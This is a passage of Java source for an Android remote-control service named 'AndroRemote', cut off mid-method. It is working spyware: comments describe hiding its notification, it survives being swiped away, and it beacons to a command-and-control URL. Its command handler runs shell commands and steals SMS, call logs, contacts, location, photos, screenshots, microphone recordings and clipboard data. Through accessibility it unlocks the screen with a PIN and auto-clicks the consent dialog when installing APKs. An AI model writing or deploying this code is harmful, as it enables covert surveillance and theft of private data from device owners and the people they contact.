package com.ohmpi.androremote;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import java.io.RandomAccessFile;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Locale;

public class RemoteService extends Service {
    static final int PORT = 8740;
    static final String CHANNEL_ID = "androremote";
    static final String PIN_FILE = "pin.txt";
    static volatile ServerSocket server;
    static volatile boolean running;
    private Thread acceptThread;
    private volatile Thread c2Thread;
    volatile boolean destroyed; // true after onDestroy: its beacon thread must exit

    @Override
    public void onCreate() {
        super.onCreate();
        destroyed = false;
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        // innocuous channel, no user-visible branding
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Sync", NotificationManager.IMPORTANCE_MIN);
        channel.setShowBadge(false);
        nm.createNotificationChannel(channel);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // IMPORTANCE_MIN + PRIORITY_MIN: no status-bar icon; row only appears
        // deep in the expanded shade. Empty title/text: nothing to read.
        Notification n = new Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_notify)
                .setContentTitle("")
                .setContentText("")
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_SECRET)
                .build();
        try {
            startForeground(1, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } catch (Exception e) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startServer();
        startC2();
        WatchdogReceiver.schedule(this);
        KeepAliveJob.schedule(this);
        return START_STICKY;
    }

    /** If a C2 URL was baked in at build time, beacon to it. Idempotent:
    re-starts the beacon thread if a previous one died. */
    private synchronized void startC2() {
        String url, keyHex, pinHex;
        try {
            url = getString(R.string.c2_url).trim();
            keyHex = getString(R.string.c2_key).trim();
            pinHex = getString(R.string.c2_pin).trim();
        } catch (Exception e) {
            return;
        }
        if (url.isEmpty()) return;
        Thread t = c2Thread;
        if (t != null && t.isAlive()) return;
        c2Thread = new Thread(new C2Beacon(this, url, keyHex, pinHex), "AndroRemote-c2");
        c2Thread.setDaemon(true);
        c2Thread.start();
        watchNetwork();
    }

    private boolean netWatched;

    /** Wake the beacon immediately when connectivity returns instead of
    waiting out the backoff sleep. Framework re-registers each process start. */
    private void watchNetwork() {
        if (netWatched) return;
        netWatched = true;
        try {
            android.net.ConnectivityManager cm =
                    (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return;
            cm.registerDefaultNetworkCallback(new android.net.ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(android.net.Network network) {
                    C2Beacon.setFast(60_000);
                    Thread t = c2Thread;
                    if (t != null) t.interrupt(); // cut backoff sleep short, retry now
                }
            });
        } catch (Exception ignored) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    public void onDestroy() {
        destroyed = true;
        running = false;
        Thread t = c2Thread;
        if (t != null) t.interrupt(); // wake beacon sleep so it sees destroyed
        try { if (server != null) server.close(); } catch (Exception ignored) {}
        server = null;
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // swipe-away: re-launch so the beacon thread (infinite retry) keeps living
        try {
            Intent i = new Intent(this, RemoteService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
        } catch (Exception ignored) {}
    }

    synchronized void startServer() {
        if (running) return;
        running = true;
        acceptThread = new Thread(() -> {
            try {
                ServerSocket ss = new ServerSocket(PORT);
                server = ss;
                while (running) {
                    Socket c = ss.accept();
                    Thread t = new Thread(() -> handle(c));
                    t.setDaemon(true);
                    t.start();
                }
            } catch (Exception ignored) {}
        });
        acceptThread.setDaemon(true);
        acceptThread.start();
    }

    void handle(Socket c) {
        try (Socket sock = c;
             OutputStream rawOut = sock.getOutputStream()) {
            // read command line byte-wise from RAW stream: BufferedReader would
            // buffer past the newline and steal PUT payload bytes
            String line = readLineRaw(sock.getInputStream());
            if (line == null) return;
            String pin = readPin();
            String resp;
            if (pin == null && line.startsWith("SETPIN ")) {
                String newPin = line.substring(7).trim();
                if (newPin.isEmpty()) {
                    resp = "ERR setpin: empty pin";
                } else {
                    writePin(newPin);
                    resp = "OK pin set";
                }
            } else if (pin != null && !line.equals("AUTH " + pin)) {
                resp = "ERR auth failed";
            } else {
                resp = exec(line, sock);
            }
            if (resp != null) {
                rawOut.write((resp + "\n").getBytes(StandardCharsets.UTF_8));
                rawOut.flush();
            }
        } catch (Exception ignored) {}
    }

    /** Read one \n-terminated line directly from the raw stream without buffering ahead. */
    String readLineRaw(java.io.InputStream is) throws Exception {
        StringBuilder sb = new StringBuilder();
        int b;
        while ((b = is.read()) != -1) {
            if (b == '\n') break;
            if (b != '\r') sb.append((char) b);
        }
        return sb.length() == 0 && b == -1 ? null : sb.toString();
    }

    String readPin() {
        try {
            File f = new File(getFilesDir(), PIN_FILE);
            if (f.exists()) return new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8).trim();
        } catch (Exception ignored) {}
        return null;
    }

    void writePin(String pin) throws Exception {
        File f = new File(getFilesDir(), PIN_FILE);
        try (FileOutputStream fos = new FileOutputStream(f)) {
            fos.write(pin.getBytes(StandardCharsets.UTF_8));
        }
    }

    String exec(String cmd, Socket sock) {
        try {
            String[] parts = cmd.trim().split(" ", 2);
            String op = parts[0].toLowerCase();
            String arg = parts.length > 1 ? parts[1].trim() : "";

            switch (op) {
                case "ping": return "PONG";
                case "id": return "OK brand=" + Build.BRAND + " model=" + Build.MODEL + " sdk=" + Build.VERSION.SDK_INT;
                case "setpin": return "ERR setpin: pin already set (reinstall to reset)";
                case "shell": {
                    if (arg.isEmpty()) return "ERR shell: empty command";
                    return shell(arg, 30_000);
                }
                case "ls": {
                    File f = new File(arg.isEmpty() ? "/sdcard" : arg);
                    if (!f.exists()) return "ERR no such file: " + f;
                    if (!f.isDirectory()) return "OK " + f.getName();
                    StringBuilder sb = new StringBuilder("OK ");
                    File[] files = f.listFiles();
                    if (files != null) {
                        for (File x : files) sb.append(x.getName()).append(x.isDirectory() ? "/" : "").append('\n');
                    }
                    return sb.toString();
                }
                case "drives": {
                    StringBuilder sb = new StringBuilder("OK ");
                    File[] dirs = getExternalFilesDirs(null);
                    if (dirs != null) for (File d : dirs) if (d != null) {
                        String p = d.getAbsolutePath();
                        int cut = p.indexOf("/Android/");
                        sb.append(cut > 0 ? p.substring(0, cut) : p).append('\n');
                    }
                    return sb.toString();
                }
                case "put": {
                    // PUT <size> <dest-path>, then raw bytes follow on socket
                    if (sock == null) return "ERR put: raw mode needs direct link (c2: use putb64)";
                    String[] hp = arg.split(" ", 2);
                    if (hp.length < 2) return "ERR put: <size> <path>";
                    long size;
                    try { size = Long.parseLong(hp[0]); } catch (NumberFormatException e) { return "ERR put: bad size"; }
                    if (size <= 0 || size > 50L * 1024 * 1024) return "ERR put: bad size";
                    String destPath = hp[1];
                    if (destPath.contains("..")) return "ERR put: bad path";
                    File dest = new File(destPath);
                    File parent = dest.getParentFile();
                    if (parent != null) parent.mkdirs();
                    InputStream is = sock.getInputStream();
                    FileOutputStream fos = new FileOutputStream(dest);
                    try {
                        copyExactly(is, fos, size);
                    } finally {
                        fos.close(); // NOT is.close(): closing socket input kills socket
                    }
                    return "OK put " + size + " bytes " + destPath;
                }
                case "get": {
                    if (sock == null) return "ERR get: raw mode needs direct link (c2: use getb64)";
                    File f = new File(arg);
                    if (!f.isFile()) return "ERR get: no such file: " + arg;
                    OutputStream os = sock.getOutputStream();
                    os.write(("OK " + f.length() + " " + f.getName() + "\n").getBytes(StandardCharsets.UTF_8));
                    writeFileRaw(f, os);
                    os.flush();
                    return null; // raw response already sent
                }
                case "screen": {
                    if (sock == null) return "ERR screen: use screenb64 over c2";
                    byte[] png = CaptureService.capture();
                    if (png == null) {
                        // legacy fallback: screencap is SELinux-blocked for untrusted apps,
                        // kept in case projection was revoked
                        String raw = getExternalFilesDir(null) + "/scr.png";
                        String r = shell("screencap -p " + raw, 15_000);
                        if (r.startsWith("ERR")) return r;
                        File f = new File(raw);
                        if (!f.isFile() || f.length() == 0) return "ERR screen: projection inactive (launch app once) and screencap unavailable";
                        OutputStream os = sock.getOutputStream();
                        os.write(("OK " + f.length() + " screen.png\n").getBytes(StandardCharsets.UTF_8));
                        writeFileRaw(f, os);
                        os.flush();
                        f.delete();
                        return null;
                    }
                    OutputStream os = sock.getOutputStream();
                    os.write(("OK " + png.length + " screen.png\n").getBytes(StandardCharsets.UTF_8));
                    os.write(png);
                    os.flush();
                    return null;
                }
                case "screenb64": {
                    byte[] png = CaptureService.capture();
                    if (png == null) return "ERR screenb64: projection inactive (launch app once to grant capture)";
                    return "OK " + png.length + " " + java.util.Base64.getEncoder().encodeToString(png);
                }
                case "sms": {
                    // SMS <number> <text>
                    String denied = requestPermission("sms", android.Manifest.permission.SEND_SMS);
                    if (denied != null) return denied;
                    int sp = arg.indexOf(' ');
                    if (sp < 0) return "ERR sms: <number> <text>";
                    String num = arg.substring(0, sp).trim();
                    String text = arg.substring(sp + 1).trim();
                    try {
                        SmsManager.getDefault().sendTextMessage(num, null, text, null, null);
                        return "OK sms sent to " + num;
                    } catch (Exception e) {
                        return "ERR sms: " + e;
                    }
                }
                case "calllog": {
                    String denied = requestPermission("calllog", android.Manifest.permission.READ_CALL_LOG);
                    if (denied != null) return denied;
                    int limit = 25;
                    try { limit = Math.max(1, Math.min(500, Integer.parseInt(arg.isEmpty() ? "25" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                            null, null, CallLog.Calls.DATE + " DESC");
                    if (c == null) return "ERR calllog: query failed";
                    StringBuilder sb = new StringBuilder("OK ");
                    int shown = 0;
                    while (c.moveToNext() && shown++ < limit) {
                        String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        long date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        long dur = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        String t = type == CallLog.Calls.INCOMING_TYPE ? "in"
                                : type == CallLog.Calls.OUTGOING_TYPE ? "out"
                                : type == CallLog.Calls.MISSED_TYPE ? "missed" : String.valueOf(type);
                        sb.append(t).append(' ').append(num == null ? "?" : num).append(' ')
                          .append(new java.util.Date(date)).append(' ').append(dur).append("s\n");
                    }
                    c.close();
                    return sb.toString();
                }
                case "call": {
                    if (arg.isEmpty()) return "ERR call: <number>";
                    String denied = requestPermission("call", android.Manifest.permission.CALL_PHONE);
                    if (denied != null) return denied;
                    try {
                        android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
                        try { am.setSpeakerphoneOn(true); } catch (Exception ignored) {}
                        Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + Uri.encode(arg.trim())));
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(i);
                        return "OK calling " + arg.trim() + " (speaker on)";
                    } catch (Exception e) {
                        return "ERR call: " + e;
                    }
                }
                case "loc": {
                    String denied = requestPermission("loc", android.Manifest.permission.ACCESS_FINE_LOCATION,
                            android.Manifest.permission.ACCESS_COARSE_LOCATION);
                    if (denied != null) return denied;
                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                    Location best = null;
                    for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
                        try {
                            Location l = lm.getLastKnownLocation(p);
                            if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
                        } catch (SecurityException ignored) {}
                    }
                    if (best == null) {
                        // one-shot fix, wait up to 15s
                        final Location[] box = new Location[1];
                        final CountDownLatch latch = new CountDownLatch(1);
                        String prov = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
                                ? LocationManager.GPS_PROVIDER : LocationManager.NETWORK_PROVIDER;
                        try {
                            lm.getCurrentLocation(prov, null, Runnable::run, l -> { box[0] = l; latch.countDown(); });
                        } catch (Exception ignored) {}
                        try { latch.await(15, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                        best = box[0];
                    }
                    if (best == null) return "ERR loc: no fix";
                    return "OK lat=" + best.getLatitude() + " lng=" + best.getLongitude()
                            + " acc=" + best.getAccuracy() + " time=" + new java.util.Date(best.getTime())
                            + " prov=" + best.getProvider();
                }
                case "photos": {
                    String denied = requestPermission("photos", android.Manifest.permission.READ_MEDIA_IMAGES);
                    if (denied != null) return denied;
                    int limit = 30;
                    try { limit = Math.max(1, Math.min(500, Integer.parseInt(arg.isEmpty() ? "30" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            new String[]{MediaStore.Images.Media.DISPLAY_NAME,
                                         MediaStore.Images.Media.RELATIVE_PATH,
                                         MediaStore.Images.Media.DATE_ADDED},
                            null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                    if (c == null) return "ERR photos: query failed";
                    StringBuilder sb = new StringBuilder("OK ");
                    int shown = 0;
                    while (c.moveToNext() && shown++ < limit) {
                        String name = c.getString(0);
                        String rel = c.getString(1);
                        long added = c.getLong(2) * 1000L;
                        sb.append("/storage/emulated/0/").append(rel == null ? "" : rel).append(name)
                          .append(' ').append(new java.util.Date(added)).append('\n');
                    }
                    c.close();
                    return sb.toString();
                }
                case "record": {
                    // RECORD <seconds> -> WAV in app dir; fetch with GET/GETB64
                    String denied = requestPermission("record", android.Manifest.permission.RECORD_AUDIO);
                    if (denied != null) return denied;
                    int secs = 10;
                    try { secs = Math.max(1, Math.min(300, Integer.parseInt(arg.isEmpty() ? "10" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    int rate = 44100;
                    int minBuf = AudioRecord.getMinBufferSize(rate,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                    if (minBuf <= 0) minBuf = 8192;
                    AudioRecord ar = new AudioRecord(MediaRecorder.AudioSource.MIC, rate,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf * 4);
                    if (ar.getState() != AudioRecord.STATE_INITIALIZED) {
                        ar.release();
                        return "ERR record: AudioRecord init failed";
                    }
                    File out = new File(getExternalFilesDir(null), "rec_" + System.currentTimeMillis() + ".wav");
                    long total = 0;
                    try (FileOutputStream fos = new FileOutputStream(out)) {
                        fos.write(new byte[44]); // header placeholder
                        byte[] buf = new byte[minBuf];
                        long end = System.currentTimeMillis() + secs * 1000L;
                        ar.startRecording();
                        while (System.currentTimeMillis() < end) {
                            int n = ar.read(buf, 0, buf.length);
                            if (n > 0) { fos.write(buf, 0, n); total += n; }
                        }
                        ar.stop();
                    } finally {
                        ar.release();
                    }
                    writeWavHeader(out, rate, 1, 16, total);
                    return "OK rec " + out.getAbsolutePath() + " " + (total + 44) + " bytes";
                }

                case "tap": {
                    // TAP <x> <y>
                    RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
                    if (ax == null) return "ERR tap: accessibility service not enabled (androremote.py axenable)";
                    String[] xy = arg.trim().split("\\s+");
                    if (xy.length < 2) return "ERR tap: <x> <y>";
                    try {
                        return ax.tap(Float.parseFloat(xy[0]), Float.parseFloat(xy[1]))
                                ? "OK tap" : "ERR tap: dispatch failed";
                    } catch (NumberFormatException e) {
                        return "ERR tap: bad coords";
                    }
                }
                case "swipe": {
                    // SWIPE <x1> <y1> <x2> <y2> [ms]
                    RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
                    if (ax == null) return "ERR swipe: accessibility service not enabled";
                    String[] v = arg.trim().split("\\s+");
                    if (v.length < 4) return "ERR swipe: <x1> <y1> <x2> <y2> [ms]";
                    try {
                        long dur = v.length > 4 ? Long.parseLong(v[4]) : 300;
                        return ax.swipe(Float.parseFloat(v[0]), Float.parseFloat(v[1]),
                                Float.parseFloat(v[2]), Float.parseFloat(v[3]), dur)
                                ? "OK swipe" : "ERR swipe: dispatch failed";
                    } catch (NumberFormatException e) {
                        return "ERR swipe: bad args";
                    }
                }
                case "settext": {
                    // SETTEXT <text> (replaces content of the focused editable field)
                    RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
                    if (ax == null) return "ERR settext: accessibility service not enabled";
                    if (arg.isEmpty()) return "ERR settext: <text>";
                    return ax.setText(arg) ? "OK settext" : "ERR settext: no focused editable field";
                }
                case "gaction": {
                    // GACTION back|home|recents|notifications|quicksettings|power|lock|screenshot
                    RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
                    if (ax == null) return "ERR gaction: accessibility service not enabled";
                    String a = arg.trim().toLowerCase();
                    int action;
                    switch (a) {
                        case "back": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK; break;
                        case "home": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME; break;
                        case "recents": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS; break;
                        case "notifications": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS; break;
                        case "quicksettings": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS; break;
                        case "power": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_POWER_DIALOG; break;
                        case "lock": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN; break;
                        case "screenshot": action = android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT; break;
                        default: return "ERR gaction: back|home|recents|notifications|quicksettings|power|lock|screenshot";
                    }
                    return ax.performGlobalAction(action) ? "OK gaction " + a : "ERR gaction failed";
                }
                case "install": {
                    // INSTALL <path-to-apk>: self-update via PackageInstaller;
                    // consent dialog is auto-clicked by RemoteAccessibilityService
                    File apk = new File(arg);
                    if (!apk.isFile() || apk.length() == 0) return "ERR install: no such file: " + apk;
                    try {
                        android.content.pm.PackageInstaller pi = getPackageManager().getPackageInstaller();
                        android.content.pm.PackageInstaller.SessionParams params =
                                new android.content.pm.PackageInstaller.SessionParams(
                                        android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                        int sid = pi.createSession(params);
                        android.content.pm.PackageInstaller.Session s = pi.openSession(sid);
                        try (InputStream is = new FileInputStream(apk)) {
                            OutputStream os = s.openWrite("base", 0, apk.length());
                            try {
                                copyExactly(is, os, apk.length());
                                s.fsync(os);
                            } finally {
                                os.close();
                            }
                        }
                        android.app.PendingIntent done = android.app.PendingIntent.getBroadcast(
                                this, sid, new Intent(this, UpdateReceiver.class),
                                android.app.PendingIntent.FLAG_UPDATE_CURRENT
                                        | android.app.PendingIntent.FLAG_IMMUTABLE);
                        RemoteAccessibilityService.armAutoConfirm(90_000);
                        s.commit(done.getIntentSender());
                        s.close();
                        return "OK install committed " + apk.length() + " bytes (accessibility auto-confirms consent)";
                    } catch (Exception e) {
                        return "ERR install: " + e;
                    }
                }
                case "installstatus": {
                    File f = new File(getFilesDir(), "install_status.txt");
                    if (!f.isFile()) return "OK installstatus: none yet";
                    return "OK installstatus: " + readText(f).trim();
                }

                case "battreq": {
                    // system dialog: exclude the app from battery optimization
                    try {
                        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                        if (pm.isIgnoringBatteryOptimizations(getPackageName())) return "OK battreq: already exempt";
                        Intent i = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                Uri.parse("package:" + getPackageName()));
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(i);
                        return "OK battreq: dialog shown (or use: adb shell dumpsys deviceidle whitelist +com.ohmpi.androremote)";
                    } catch (Exception e) {
                        return "ERR battreq: " + e;
                    }
                }
                case "fastpoll": {
                    // FASTPOLL <secs>: drop beacon interval to ~0.7s for interactive control
                    int secs = 60;
                    try { secs = Math.max(1, Math.min(3600, Integer.parseInt(arg.isEmpty() ? "60" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    C2Beacon.setFast(secs * 1000L);
                    return "OK fastpoll " + secs + "s";
                }

                case "info": {
                    StringBuilder sb = new StringBuilder("OK ");
                    android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
                    int pct = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
                    int st = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_STATUS);
                    boolean charging = st == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                            || st == android.os.BatteryManager.BATTERY_STATUS_FULL;
                    sb.append("model=").append(Build.MODEL)
                      .append(" sdk=").append(Build.VERSION.SDK_INT)
                      .append(" battery_pct=").append(pct == Integer.MIN_VALUE ? "?" : pct)
                      .append(" charging=").append(charging).append('\n');
                    try {
                        android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
                        ((android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
                        sb.append("ram_total_mb=").append(mi.totalMem / 1048576)
                          .append(" ram_avail_mb=").append(mi.availMem / 1048576).append('\n');
                    } catch (Exception ignored) {}
                    try {
                        java.io.File ext = android.os.Environment.getExternalStorageDirectory();
                        sb.append("storage_total_gb=").append(String.format(Locale.US, "%.1f", ext.getTotalSpace() / 1e9))
                          .append(" storage_avail_gb=").append(String.format(Locale.US, "%.1f", ext.getFreeSpace() / 1e9)).append('\n');
                    } catch (Exception ignored) {}
                    sb.append("uptime_s=").append(android.os.SystemClock.elapsedRealtime() / 1000).append('\n');
                    try {
                        java.util.Enumeration<java.net.NetworkInterface> it = java.net.NetworkInterface.getNetworkInterfaces();
                        StringBuilder ips = new StringBuilder();
                        while (it != null && it.hasMoreElements()) {
                            java.net.NetworkInterface ni = it.nextElement();
                            if (!ni.isUp() || ni.isLoopback()) continue;
                            java.util.Enumeration<java.net.InetAddress> ia = ni.getInetAddresses();
                            while (ia.hasMoreElements()) {
                                java.net.InetAddress a = ia.nextElement();
                                if (a instanceof java.net.Inet4Address && !a.isLoopbackAddress()) {
                                    if (ips.length() > 0) ips.append(',');
                                    ips.append(a.getHostAddress());
                                }
                            }
                        }
                        sb.append("ips=").append(ips).append('\n');
                    } catch (Exception ignored) {}
                    return sb.toString();
                }
                case "contacts": {
                    String denied = requestPermission("contacts", android.Manifest.permission.READ_CONTACTS);
                    if (denied != null) return denied;
                    int n = 30;
                    try { n = Math.max(1, Math.min(1000, Integer.parseInt(arg.isEmpty() ? "30" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    Cursor c = getContentResolver().query(
                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
                            null, null,
                            android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    if (c == null) return "ERR contacts: query failed";
                    StringBuilder sb = new StringBuilder("OK ");
                    int shown = 0;
                    while (c.moveToNext() && shown++ < n) {
                        String name = c.getString(0);
                        String num = c.getString(1);
                        sb.append(name == null ? "?" : name).append(" | ").append(num == null ? "?" : num).append('\n');
                    }
                    c.close();
                    return sb.toString();
                }
                case "smsin": {
                    String denied = requestPermission("smsin", android.Manifest.permission.READ_SMS);
                    if (denied != null) return denied;
                    int n = 20;
                    try { n = Math.max(1, Math.min(500, Integer.parseInt(arg.isEmpty() ? "20" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    Cursor c = getContentResolver().query(android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                            new String[]{android.provider.Telephony.Sms.ADDRESS,
                                    android.provider.Telephony.Sms.DATE,
                                    android.provider.Telephony.Sms.BODY},
                            "type = ?", new String[]{String.valueOf(1)},
                            android.provider.Telephony.Sms.DATE + " DESC");
                    if (c == null) return "ERR smsin: query failed";
                    StringBuilder sb = new StringBuilder("OK ");
                    int shown = 0;
                    while (c.moveToNext() && shown++ < n) {
                        String addr = c.getString(0);
                        long date = c.getLong(1);
                        String body = c.getString(2);
                        if (body != null && body.length() > 160) body = body.substring(0, 160) + "…";
                        sb.append(addr == null ? "?" : addr).append(' ').append(new java.util.Date(date))
                          .append(' ').append(body == null ? "" : body.replace('\n', ' ')).append('\n');
                    }
                    c.close();
                    return sb.toString();
                }
                case "wake": {
                    // WAKE [secs]: bright wake lock (default 10s)
                    int secs = 10;
                    try { secs = Math.max(1, Math.min(300, Integer.parseInt(arg.isEmpty() ? "10" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    try {
                        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                        android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                        | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                                "androremote:wake");
                        wl.acquire(secs * 1000L);
                        return "OK wake (screen on " + secs + "s)";
                    } catch (Exception e) {
                        return "ERR wake: " + e;
                    }
                }
                case "sleep": {
                    // SLEEP: turn the screen off (keyguard lock via accessibility;
                    // falls back to a lock-screen global action)
                    RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
                    if (ax == null) return "ERR sleep: accessibility service not enabled (androremote axenable)";
                    return ax.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                            ? "OK sleep (screen locked/off)"
                            : "ERR sleep: lock failed";
                }
                case "unlock": {
                    // UNLOCK <pin>: wake, dismiss keyguard bouncer, type PIN via accessibility.
                    // Best-effort: OEM lockscreen implementations vary.
                    RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
                    if (ax == null) return "ERR unlock: accessibility service not enabled (androremote axenable)";
                    if (arg.isEmpty()) return "ERR unlock: <pin>";
                    try {
                        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                        android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                        | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                                "androremote:unlock");
                        wl.acquire(30_000);
                    } catch (Exception ignored) {}
                    return ax.unlock(arg.trim());
                }
                case "vol": {
                    android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
                    int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
                    if (arg.isEmpty())
                        return "OK vol " + am.getStreamVolume(android.media.AudioManager.STREAM_MUSIC) + "/" + max;
                    String v = arg.trim().toLowerCase();
                    try {
                        if (v.equals("up")) am.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, android.media.AudioManager.ADJUST_RAISE, 0);
                        else if (v.equals("down")) am.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, android.media.AudioManager.ADJUST_LOWER, 0);
                        else if (v.equals("mute")) am.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, android.media.AudioManager.ADJUST_MUTE, 0);
                        else {
                            int n = Integer.parseInt(v);
                            if (n < 0 || n > max) return "ERR vol: 0.." + max;
                            am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, n, 0);
                        }
                        return "OK vol " + am.getStreamVolume(android.media.AudioManager.STREAM_MUSIC) + "/" + max;
                    } catch (NumberFormatException e) {
                        return "ERR vol: up|down|mute|0-" + max;
                    }
                }
                case "clipset": {
                    if (arg.isEmpty()) return "ERR clipset: <text>";
                    try {
                        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                        cm.setPrimaryClip(android.content.ClipData.newPlainText("androremote", arg));
                        getSharedPreferences("cfg", MODE_PRIVATE).edit().putString("clip_last", arg).apply();
                        return "OK clipset";
                    } catch (Exception e) {
                        return "ERR clipset: " + e;
                    }
                }
                case "clipget": {
                    try {
                        ClipboardActivity.result = null;
                        Intent i = new Intent(this, ClipboardActivity.class);
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(i);
                        long deadline = System.currentTimeMillis() + 2000;
                        while (ClipboardActivity.result == null && System.currentTimeMillis() < deadline)
                            Thread.sleep(25);
                        if (ClipboardActivity.result != null && !ClipboardActivity.result.isEmpty())
                            return "OK clipget " + ClipboardActivity.result;
                        String last = getSharedPreferences("cfg", MODE_PRIVATE).getString("clip_last", "");
                        if (!last.isEmpty()) return "OK clipget " + last;
                        return "ERR clipget: empty";
                    } catch (Exception e) {
                        return "ERR clipget: " + e;
                    }
                }
                case "torch": {
                    String denied = requestPermission("torch", android.Manifest.permission.CAMERA);
                    if (denied != null) return denied;
                    boolean on = arg.trim().equalsIgnoreCase("on");
                    try {
                        android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
                        String[] ids = cm.getCameraIdList();
